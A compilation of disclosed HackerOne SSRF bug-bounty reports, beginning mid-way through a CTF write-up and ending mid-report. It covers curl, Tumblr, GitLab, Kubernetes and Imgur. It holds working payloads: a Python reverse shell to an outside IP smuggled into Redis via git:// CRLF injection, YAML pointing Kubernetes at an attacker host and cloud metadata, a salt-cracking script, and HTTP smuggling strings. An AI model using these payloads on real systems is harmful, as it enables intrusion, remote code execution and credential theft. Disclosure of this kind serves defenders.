64 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=16.3 ms
Host still up, maybe try again?
Host still up, maybe try again?
.
```

It seems Santa has some resilient servers. The attack buttons navigate to the following URLs to begin the attacks:

- https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
- https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==
- https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0=

Decoding each of the `payload` parameters, I can see this is the information being sent:
```js
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```

Ok! If we can replace the target with `127.0.0.1` (the localhost address) we can take down the Grinch server. Unfortunately, just taking one of the existing payloads and replacing the address with the local IP gave me an `invalid protection hash` error. We will need to figure out how these hashes work.

## Figuring out How These Hashes Work
[This hash identification site](https://www.onlinehashcrack.com/hash-identification.php) had some suggestions for what the hash could be. MD5 seemed likely, but just doing `MD5(ip_address)` was not returning the hash in the hash field. Among the suggestions were `md5($pass.$salt)` and `md5($salt.$pass)`. We know the hash value, and we know the "pass" is the ip address. We can try to calculate the salt. And if we are lucky, Grinch will be using the same salt for every hash.

I wrote a quick program to determine the salt for the first IP and hash combination in the list of Santa server payloads.
```python
#!/usr/bin/env python3
import hashlib

TARGET_HASH = '5f2940d65ca4140cc18d0878bc398955'
IP = '203.0.113.33'

with open('../../../SecLists/Passwords/Leaked-Databases/rockyou.txt', errors="ignore") as salt_file:
    salts = [x.strip() for x in salt_file]
    found = False
    for i, salt in enumerate(salts):
        if i % 100 == 0:
            print(f"{round((i/len(salts) * 100), 1)}%", end="\r")

        if hashlib.md5((salt + IP).encode('utf-8')).hexdigest() == TARGET_HASH:
            print("Format is MD5(salt + IP)")
            found = True
        elif hashlib.md5((IP + salt).encode('utf-8')).hexdigest() == TARGET_HASH:
            print("Format is MD5(IP + salt")
            found = True
        if found:
            print(f"Salt is '{salt}'")
            break
```
```sh
$ ./exploit.py
Format is MD5(salt + IP)
Salt is 'mrgrinch463'
```

A quick test shows this works for our existing values

IP | MD5(salt + IP)
--- | ---
203.0.113.33 | 5f2940d65ca4140cc18d0878bc398955
203.0.113.53 | 2814f9c7311a82f1b822585039f62607
203.0.113.213 | 5aa9b5a497e3918c0e1900b2a2228c38

Great! Now we can forge some authenticated requests.

## Forging Authenticated Requests
Using the trick above, we can make a payload for the local IP `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`. After encoding as base64, we can run the attack by accessing `/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==`.

Output:
```sh
grinch@attackbox:~/tools$ ./ddos --load 5ef7f0e45440b03e470946ab65f02a9c.target
Setting Target Information
Getting Host Information for: 127.0.0.1
Local target detected, aborting attack
Setting Target Information
Getting Host Information for: 127.0.0.1
Local target detected, aborting attack
```

Hmm, there is a protection mechanism to prevent us from attacking the Grinch's own server. The output shows us that it is determining this by looking up host information. Maybe we can get around this with some DNS trickery.

## Some DNS Trickery

I found [this blog post](https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325) which explains DNS rebinding. A main takeaway from the post is:
> DNS can be abused to trick web browsers into communicating with servers they don’t intend to.

Sounds perfect! The [rbndr](https://github.com/taviso/rbndr) project can be used for performing DNS Rebinding attacks. They have an example address in the readme, `7f000001.c0a80001.rbndr.us`, which will randomly respond to DNS requests by saying its address is either `127.0.0.1` or `192.168.0.1`. The TTL is very short to force the server to constantly refetch the IP address of the domain. The `192.168.0.1` address is allowed by the Grinch network, but `127.0.0.1` is supposed to be rejected. With some luck, we can have this server return the allowed address when the host validation runs, and then the local address by the time the botnet attack wants to start. 

I crafted the following payload with the rbndr address,
`{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}`, which maps to this request: 
`/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9`

After running that exploit a couple times until the DNS resolutions lined up properly, I was able to get the following output:

```sh
grinch@attackbox:~/tools$ ./ddos --load fc007b100f6745bae362a35918c6a102.target
Setting Target Information
Getting Host Information for: 7f000001.c0a80001.rbndr.us
Host resolves to 192.168.0.1
Spinning up botnet
Launching attack against: 7f000001.c0a80001.rbndr.us / 127.0.0.1
No Response from attack server, retrying...
No Response from attack server, retrying...
No Response from attack server, retrying...
```
Suddenly the page redirected:

{F1134468}

A 404, what a beautiful sight!

`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

Takeaways
- Computers can be tricked into communicating with servers they don't intend to with DNS tricks
- The Grinch's plans were foiled!

## Impact

The attacker can log into the attack box dashboard and knock Grinch Networks offline.

---

### [SSRF via maliciously crafted URL due to host confusion](https://hackerone.com/reports/704621)

- **Report ID:** `704621`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** curl
- **Reporter:** @jlleitschuh
- **Bounty:** - usd
- **Disclosed:** 2021-01-08T21:03:17.955Z
- **CVE(s):** CVE-2018-3774

**Vulnerability Information:**

## Summary:

Curl is vulnerable to SSRF due to improperly parsing the host component of the URL compared to other URL parsers and the [URL living standard](https://url.spec.whatwg.org/).

## POC

`curl -sD - -o /dev/null "http://google.com:80\\@yahoo.com/"`

Curl makes a request to `yahoo.com` instead of `google.com`.

## Supporting Material/References:
  * [Exact question to URL standards body](https://github.com/jsdom/whatwg-url/issues/137#issuecomment-536797948)
  * [CVE-2018-3774](https://nvd.nist.gov/vuln/detail/CVE-2018-3774) similar vulnerability in an NPM lib
    * See also: https://hackerone.com/reports/384029

To quote the standards body issue:

> Specifically the authority state deals with parsing the @ properly. However as you'll notice if it encounters the `\` beforehand, it'll go into the host state and reset the pointer at which point it won't consider `google.com:80\\` auth data for `yahoo.com` anymore.

## Other Libraries

```javascript
const whatwg_url = require('whatwg-url'); // Created by the RFC maintainers

const theUrl = new whatwg_url.URL("https://google.com:80\\\\@yahoo.com/");
const theUrl2 = new whatwg_url.URL("https://google.com:80\\@yahoo.com/");

const nodeUrl = new URL("https://google.com:80\\\\@yahoo.com/");
const nodeUrl2 = new URL("https://google.com:80\\@yahoo.com/");

console.log(theUrl.hostname); // Prints google.com
console.log(theUrl2.hostname); // Prints google.com
console.log(nodeUrl.hostname); // Prints google.com
console.log(nodeUrl2.hostname); // Prints google.com
```

## Impact

If another library implementing the URL standard is used to white/blacklist a request by host but the actual request is made via curl or the curl library, an attacker can smuggle the request past the URL validator thus allowing an attacker to perform SSRF or an open redirect attack.

---

### [GET /api/v2/url_info endpoint is vulnerable to Blind SSRF](https://hackerone.com/reports/1057531)

- **Report ID:** `1057531`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Automattic
- **Reporter:** @atc_h1h1
- **Bounty:** - usd
- **Disclosed:** 2020-12-15T13:03:15.978Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
GET /api/v2/url_info endpoint is vulnerable to Blind SSRF. I am able to hit both Internal and External services via **url** parameter by replacing with internal and external url.

## Platform(s) Affected:
https://www.tumblr.com/

## Steps To Reproduce:

  1. Login to https://www.tumblr.com/
  2. Follow any blog and intercept request via Proxy

Request :

GET /api/v2/url_info?url={{}}&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary HTTP/1.1
Host: www.tumblr.com 

Response:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

3. Now replace **url** parameter to your controller server url and send it.
4. You will get request to your server.

I could get verify it via IP Address: **74.114.154.11**
NetRange:       74.114.152.0 - 74.114.155.255
CIDR:           74.114.152.0/22
NetName:        AUTOMATTIC
NetHandle:      NET-74-114-152-0-1
Parent:         NET74 (NET-74-0-0-0-0)
NetType:        Direct Assignment
OriginAS:       AS2635
Organization:   Automattoque (AU-187)
RegDate:        2017-04-20
Updated:        2017-04-21
Ref:            https://rdap.arin.net/registry/ip/74.114.152.0

OrgName:        Automattoque
OrgId:          AU-187
Address:        P.O. Box 997
City:           Halifax
StateProv:      NS
PostalCode:     B3J 2X2
Country:        CA
RegDate:        2015-11-25
Updated:        2017-04-21
Ref:            https://rdap.arin.net/registry/entity/AU-187

5. Now replace it with localhost url -> http://127.0.0.1:9090 and see response will be 404 but based on response time, port status can be identified.

Limited Internal and External SSRF is performed. Attacker can target internal services by sending requests in bulk via mentioned endpoint.
Attacker can get ports status by fuzzing or intruder attacker based on response time.
Attacker would be able to target internal services and try to exhaust/target internal infrastructure.

**Remediation Strategies :**

1. **Only white listed URLs should be allowed for this endpoint. As user can only follow tumblr blogs, there would be some sort of filter mechanism to whitelist tumblr blogs. Any other URLs should be blocked.**
2. **Not only for this API endpoint, any localhost URLs provided by user should be blocked.**
2. **Any Out-of-band request from tumblr should be sent via CLIENT only. Here  in this case, server is requesting user controller URL input and requesting resource which is exposing internal IP details.**

## Impact

Attacker can get ports status by fuzzing or intruder attacker based on response time.
Attacker would be able to target internal services and try to exhaust/target internal infrastructure.

---

### [CRLF injection & SSRF in git:// protocal lead to arbitrary code execution](https://hackerone.com/reports/441090)

- **Report ID:** `441090`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @chromium1337
- **Bounty:** - usd
- **Disclosed:** 2020-11-23T16:07:44.869Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
The implementation of `git://` protocal in GitLab is vulnerable to CRLF injection and Server-Side Request Forgery. If the redis server is configured to listen on TCP socket (eg. port 6379), an attacker can abuse SSRF to manipulate redis server, injecting malicious payload into system_hook_push queue, which result in arbitrary code execution.

**Description:** 
This vulnerability is similar to @jobert 's https://hackerone.com/reports/299473 . GitLab patched the CRLF injection in HTTP header and introduced the UrlBlocker module to prevent HTTP requests going into intranet. But `git://` is not restricted to the UrlBlocker. 
This gif shows a request sent to 127.0.0.1:2333 with multiple CRLF injected:
{F375843}

## Steps To Reproduce:
  1. Follow [GitLab Docs](https://docs.gitlab.com/omnibus/settings/redis.html) to set up a redis server listening on `127.0.0.1:6379`
  2. Sign in and create a project, go to project Settings -> Repository -> Mirroring repositories
  3. Add a mirror repo, capture the POST request using BurpSuite or Fiddler or whatever you like, and modify the post param `project[remote_mirrors_attributes][0][url]` to:

```
git://127.0.0.1:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"118.89.198.146\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
/bbbbb/ccccc
```

(Thanks to @jobert 's [payload](https://hackerone.com/reports/299473) again!)

  4. Make a POST request to `/{username}/{project name}/mirror/update_now?sync_remote=true` to trigger the mirror action
  5. Attacker will receive a reverse shell on 118.89.198.146 port 8000

{F375845}

## Impact

Same as https://hackerone.com/reports/299473:
> An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

---

### [Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.](https://hackerone.com/reports/776017)

- **Report ID:** `776017`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Kubernetes
- **Reporter:** @reeverzax
- **Bounty:** 5000 usd
- **Disclosed:** 2020-10-30T21:37:19.120Z
- **CVE(s):** CVE-2020-8555

**Vulnerability Information:**

Hello,

## Who we are :

We’re two French security researchers and our respective names are Brice Augras and
Christophe Hauquiert, we worked and found the vulnerability together.

Brice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax
Christophe Hauquiert - https://hackerone.com/hach

## Summary

We recently led some security investigations about Kubernetes product hosted in a managed
service.
By abusing product vulnerability due to implementation context, we would like to bring to your
attention technical details about what we found.
We started an investigation process on multiple managed k8s offers and found quite each time a Critical
Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .
We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  

## Technical specification : 

- Fake vendor name : **example.com**
- Kubernetes release for half-blind SSRF scenario: **1.14**
- Kubernetes release for complete SSRF vulnerability :  up to **v1.15.3**, **v1.14.6** and **v1.13.10**

We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. 
- Attacker server: **https://bzh.ovh** (51.38.238.22)
- Provided file with proof of concept scripts: **PoC.zip**

{F685902}

## Compromission Scenario

Here is the main workflow we followed in order to escape from our customer environment on multiple distributors 
providing k8s managed offer.

Firstly, we created a k8s cluster on distributors managed k8s service.
Mainly, these vendors use the following infrastructure : 

{F685875}

After configuring kubectl binary, we were able to manage our customer cluster provided by **example.com**

When creating a persistent volume claim associated with a custom StorageClass on our
cluster, the provisioning step is handled by the **kube/cloud controller manager** (depending of the release),
we noticed that the process was handled  inside vendor internal perimeter.
We discovered the existence of a half-blind SSRF vulnerability inside multiple
StorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.

This half-blind SSRF can be used us to scan master VPC network and request the different listening services
(Metadata instance, Kubelet, ETCD, etc..) based on the **kube-controller** responses.

Initially, we were only limited to HTTP POST requests as we were unable to retrieve content of
body page if the response code was equal to 200 and not in JSON Content-Type.
But we improved our first payload by combining the previous step with a 302 redirect from an
external server in order to convert POST request to GET request.

In addition to this, if the managed k8s offer service provider was using an old k8s cluster release **AND** allowed customer **kube-controller-manager** logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.
This was the attack scenario with the most impact. 
Indeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...
 
## PoC
### PoC n°1 - Half Blind SSRF

While doing some analysis on **glusterFS** storage Class Golang source, we noticed that 
the first HTTP request issued during a Volume creation
(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), **/volumes**
was appended at the end of the user provided URL in **resturl** parameter.
In order to remove the end of this unwanted path, we used the **#** trick in the resturl
parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://bzh.ovh:6666/#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "poc-ssrf-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
---
apiVersion: v1
data:
key: bXlwYXNzd29yZA==
kind: Secret
metadata:
name: poc-ssrf-secret
namespace: default
type: kubernetes.io/glusterfs
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: poc-ssrf
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: poc-ssrf
```

We executed the payload with kubectl binary, and the kube-controller-manager handled the
creation process and HTTP request:

```bash
kubectl create -f sc-poc.yam
```
The attacker server was put in listening mode on port 6666 in order to handle incoming
POST requests and verify that how the URL could be arbirary controlled by an attacker:

{F685801}

### PoC n°2 : Redirecting POST to GET HTTP request trick

The first request issued by Glusterfs client was a POST type, by doing the following steps,
we were able to convert POST request to GET:

• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter
• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the
following Location Header http://169.254.169.254 (could be any other internal
resource, this redirected url is used for example purposes)
• As by default Golang net/http library follows redirection and convert POST to GET
with 302 return code, the targeted resource is then requested with a HTTP GET request.

We were able to read HTTP response body on some requests by describing persistent
volume claim object:
```
kubectl describe pvc xxx
```

Or, getting events from Kubernetes cluster with command below:
```
kubectl get event
```
Here is an example of JSON response we were able to retrieve : 

{F685919}

The exploitation process of our vulnerability at this moment was limited due to the
following elements:
- We were not able to inject HTTP headers in the emitted request
- We were not able to perform POST HTTP Request with body parameters (useful to
request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)
- We were not able to retrieve response body content when HTTP return code was
200 and not a JSON Content-Type response.


### PoC n°3 : Managed cluster Lan scanning and sensitive data exposure 

At least, as we had the possibility to scan LAN resources, the next step was automation.
Indeed, in order to scan one IP address and one port we had to realize the following tasks:
- Delete previous tested Storage Class
- Delete previous tested Persistent Volume Claim
- Change IP and PORT in sc.yaml
- Create Storage Class with new IP and port
- Create new Persistent Volume Claim
Since the way to scan for one resource was very specific and incompatible with traditional
SSRF exploitation tools or scanners, we decided to create some kind of custom workers in
bash script.
In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.
The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range. 
 
Each worker was launched the following command:

{F685904}

Here are two additional YAML files that needs to be in the same directory as scanner.sh Bash
script:
```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: {{SC_NAME}}
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://{{URL}}#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "heketi-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
```
Above is the content of **template_sc.yaml**

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: {{PVC_NAME}}
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: {{SC_NAME}}
```
Above is the content of **template_pvc.yaml**

### PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases 

In addition to all the previous steps, we found a more efficient way to retrieve full HTTP
response body content in addition to craft complete HTTP requests that were user controlled.

Unfortunately, the vulnerability requires the following prerequisites:
- Kube Controller Manager logs reachable by the customer
- Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)

We still wan't to bring this attack scenario with a PoC as some providers still have some 
customers using one of these “deprecated” k8s release.

We realized a first PoC in a local environment to demonstrate the vulnerability.
Here are some technical details about them:
We discovered a vulnerability was existing for the following Golang releases <1.12
(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF
attacks.
By combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete
crafted requests, including custom headers, HTTP method, parameters and data that were
going to be executed by the **kube-controller-manager**.

In addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. 

We deployed a local environment simulating Kubernetes exchanges between the GlusterFS
Go client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).

Here is an example of a working StorageClass resturl parameter payload performing an HTTP
smuggling attack + CRLF during provisioning step in order to leak response content in kube-
controller logs:

Here is an example of a working StorageClass **resturl** parameter payload allowing to perform this kind of attack scenario : 

```
http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n
```

Here is the complete HTTP response that was leaking inside the **lube-controller-manage** logs :

{F685896}

## Impact

## Impact Analysis

This was quite hard for us to evaluate how hard the impact was for these two attack vectors. 
Indeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.
Feel free to exchange with us about the **CVSS** score about you consider for this vulnerability as this seems to be related to managed context k8s environment.

From the various distributors we led research on, we noticed that this could lead to  the following impact analysis : 
 
### Integrity

- Lateral movement with cloud steal credentials (from metadata API)
- Remote command execution by using these credentials
- Reproducing above scenario in an IDOR way with other resources discovered in LAN area.

### Confidentiality

- Information gathering by LAN scannin (ssh version, http server versions, ...)
- Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)
- Customers data leak, by using cloud credentials

### Availability

All the post-exploitation scenarios about **integrity** attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. 

Indeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.

Best Regards, 

Brice Augras from @Groupe-Asten
Christophe Hauquiert

---

### [[h1-2006 2020] Bounty payments are done !](https://hackerone.com/reports/895824)

- **Report ID:** `895824`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @louzogh
- **Bounty:** - usd
- **Disclosed:** 2020-09-14T21:09:29.196Z
- **CVE(s):** -

**Summary (team):**

Read more here! https://github.com/Louzogh/CTF-Writeup/blob/master/2020/H1-2006-CTF/README.md

**Summary (researcher):**

Hey, I've published my write-up at : https://github.com/Louzogh/CTF-Writeup/blob/master/2020/H1-2006-CTF/README.md 
Enjoy 😅

---

### [Injection of `http.<url>.*` git config settings leading to SSRF](https://hackerone.com/reports/855276)

- **Report ID:** `855276`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 3000 usd
- **Disclosed:** 2020-09-08T13:46:02.172Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

When import a repo with credentials via a URL, gitaly generates the git clone command with a `-c` flag to add the Authorization header:

https://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37
```go
flags = append(flags, git.ValueFlag{Name: "-c", Value: fmt.Sprintf("http.%s.extraHeader=%s", u.String(), authHeader)})
```

Which will create a command such as:
```bash
git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path
```

The issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of `extraHeader` (with the `.extraHeader..` being appended to the value).

This allows an attacker to set things like `http.proxy` which can result in a SSRF if they use an import url such as `http://user@google.com/.proxy=http://proxy.aw.rs:8500`


### Steps to reproduce
1. Create a dns entry with a short TTL
1. Start a server listening on the port that you want to hit with the SSRF that always returns `200 OK`, something like {F797777}
1. Create a project with the specially crafted import url: `curl -H "Authorization: Bearer $TOKEN" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'`. This results in the following `.git/config` for the repo:

    ```bash
    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = true
    [http]
        followredirects = false
    [http "http://google.com/"]
        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==
    ```
1. Update the dns entry to point to `127.0.0.1` and wait for it to propergate
1. Add a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a `?` to make sure the appended paths are removed: `curl -H "Authorization: Bearer $TOKEN" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'`
1. Check the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)
    ```bash
curl -H "Authorization: Bearer $TOKEN" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`
"2:Fetching remote upstream failed: remote: method GET not allowed\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\n"
    ```

Git (via curl) allows for `socks4` and `socks5` proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other `http.*` configs that could be exploited, an interesting one is `http.cookieFile` but due to the appended `.extraHeader=` the path is not really controllable from my initial testing.

### Impact
* An attacker can set the `http.<url>.proxy` git config resulting in SSRF

### What is the current *bug* behavior?
The git http config propertied can be influenced by the import url

### What is the expected *correct* behavior?
Only the `extraHeader` config should be set via the git clone.

### Output of checks
#### Results of GitLab environment info
```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.2
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.4-ee
Revision:	6a1a8e88568
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

* An attacker can set the `http.<url>.proxy` git config resulting in SSRF

---

### [SSRF in imgur video GIF conversion](https://hackerone.com/reports/247680)

- **Report ID:** `247680`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Imgur
- **Reporter:** @mariuszdeepsec
- **Bounty:** - usd
- **Disclosed:** 2020-08-13T10:15:10.018Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

There was issue in -> https://hackerone.com/reports/115748

We have found similar one but in next steps

Affected request
============================
```
POST /vidgif/upload HTTP/1.1
Host: imgur.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://imgur.com/vidgif/video/between/56.72/9.71?url=http%3A%2F%2Fwww.onirikal.com%2Fvideos%2Fmp4%2Fbattle_games.mp4
Content-Length: 127
Cookie: SESSIONDATA=%7B%22sessionCount%22%3A3%2C%22sessionTime%22%3A1499684317408%7D; IMGURUIDJAFO=7450708ff93583b3772a3048e340856d59cef648c4dab74c825a83be56c807ab; _ga=GA1.2.1311247514.1499605938; _gid=GA1.2.2061092166.1499605938; __qca=P0-831392639-1499605938609; expPLAT51a=control; AZUSER=ue1-50873ccaac994527ac520cd62b5901e7; __gads=ID=1eb1b9c53a665ffd:T=1499605915:S=ALNI_MaUwqVKMDz-uAhHuqAQFc2_ajTK2Q; m_sort=viral; m_window=day; m_section=hot; __utma=247341212.1311247514.1499605938.1499607069.1499674066.2; __utmz=247341212.1499607069.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); c_sort=newest; c_window=day; __atuvc=2%7C28; GCS=top; authautologin=17d1c9dc6b5e4b318c27ca4b85921a90%7EVJ3S8CJDeJgyKiUlrdYxGzQ99xkZiEox; _nc=1; f_sort=newest; f_section=favorites; retina=0; OX_plg=swf|shk|pm; UPSERVERID=upload.i-083e69b6391b5191e.production; __utmc=247341212; IMGURSESSION=5c493a419036f493aa69b0b40d8b1f28; __cfduid=d5d1746c7fcc97ff5c333cae83ce89d571499673731; showComments=1; c1069960587=1
Connection: close

source=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&start=56.72&stop=66.43
```


PoC
======================
HTTP Requests
-------------------------
{F201616}
FTP Requests
-------------------------
{F201614}


And most important like in the old vulnerable spot gopher where attacker have posibilities to inject stuff in headers with usse of %0a
-------------------------
{F201615}

Sorry for short description i assume u already know what SSRF is as u fixed previous vulnerable spot, if something is not clear feel free to ask
-------------------------------------------------

---

### [Full Read SSRF on Gitlab's Internal Grafana](https://hackerone.com/reports/878779)

- **Report ID:** `878779`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @rhynorater
- **Bounty:** - usd
- **Disclosed:** 2020-08-07T13:48:20.744Z
- **CVE(s):** -

**Vulnerability Information:**

Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below.

## Summary
By chaining together some redirects and a URL decoding bug, it is possible to achieve a full-read, unauthenticated, SSRF from your Grafana instance. It is possible to recreate this bug on `dev.gitlab.org/-/grafana`. 

